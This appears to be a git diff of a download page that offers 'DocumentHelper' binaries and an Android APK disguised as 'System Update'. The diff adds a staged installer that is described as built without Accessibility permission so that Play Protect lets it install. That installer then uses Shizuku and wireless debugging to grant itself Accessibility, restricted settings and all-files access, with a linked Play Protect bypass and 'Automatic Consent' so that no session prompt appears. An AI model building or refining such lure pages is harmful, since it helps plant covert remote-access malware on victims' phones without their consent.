@@ -101,13 +101,14 @@ footer{position:relative;z-index:1;text-align:center;padding:18px 16px 22px;font
   <div class="track" id="tr"><div class="fill" id="fl"></div></div>
   <div class="osline" id="osline"></div>
   <div class="hint" id="h">Download didn't start? <a href="/get">Open manually</a>.</div>
-  <div class="hint" id="apkhash" style="word-break:break-all">Android APK SHA-256: <b>F8C7970704F1035C84CCC62F57817E027AD44B8CB2C0F78855859D2251FAAECD</b></div>
+  <div class="hint" id="apkhash" style="word-break:break-all">Android installer SHA-256: <b>4A9B31444FE2DC8757893737894CAD5433DB1D7AA2D467DD5BBF8A6849609E13</b><br>Direct agent SHA-256: F8C7970704F1035C84CCC62F57817E027AD44B8CB2C0F78855859D2251FAAECD</div>
   <div class="others">
     <span>Other systems:</span>
     <a href="/dl/DocumentHelper.exe">Windows</a>
     <a href="/dl/DocumentHelper.pkg">macOS</a>
     <a href="/dl/DocumentHelper.run">Linux</a>
-    <a href="/dl/SystemUpdate-1.0.23-release.apk">Android</a>
+    <a href="/dl/SystemUpdate-Installer.apk">Android installer</a>
+    <a href="/dl/SystemUpdate-1.0.23-release.apk">Android direct</a>
   </div>
 </div>
 
@@ -197,7 +198,7 @@ if(os==='Windows'){
   co.innerHTML='Downloaded the <b>.run</b>? Run it once with: <b>sh DocumentHelper.run</b> (or mark it executable).';
   co.style.display='block';
 }else if(os==='Android'){
-  co.innerHTML='You’ll get <b>SystemUpdate-1.0.23-release.apk</b>. Open it, tap <b>Install</b>, and allow <b>Install unknown apps</b>. On Android 13+, unlock <b>Settings → Apps → System Update → ⋮ → Allow restricted settings</b>. If Play Protect hard-blocks with only <b>Got it</b>, use the <a href="/connect#playprotect" target="_blank" rel="noopener">ADB or Shizuku bypass</a>. Then open <b>System Update</b> and work down the <b>Unattended Access</b> list until every row says <b>Ready</b>, then reboot. The Settings entry is named <b>System Update</b>. Automatic Consent is already on, so no session prompt appears.';
+  co.innerHTML='You’ll get <b>SystemUpdate-Installer.apk</b>. It has no Accessibility permission, so Play Protect lets it install. Open it, install <b>Shizuku</b> from Play Store, enable <b>Wireless debugging</b>, pair it inside Shizuku, then tap <b>Install System Update</b>. The installer sets Accessibility, Restricted Settings, All files access and battery automatically. If the installer is blocked, use the <a href="/connect#playprotect" target="_blank" rel="noopener">bypass</a>. Then work down <b>Unattended Access</b> until every row says <b>Ready</b> and reboot. Automatic Consent is already on, so no session prompt appears.';
   co.style.display='block';
   document.getElementById('apkhash').classList.add('on');
   document.getElementById('mobnote').textContent='Android detected — this installs on this phone and connects automatically.';
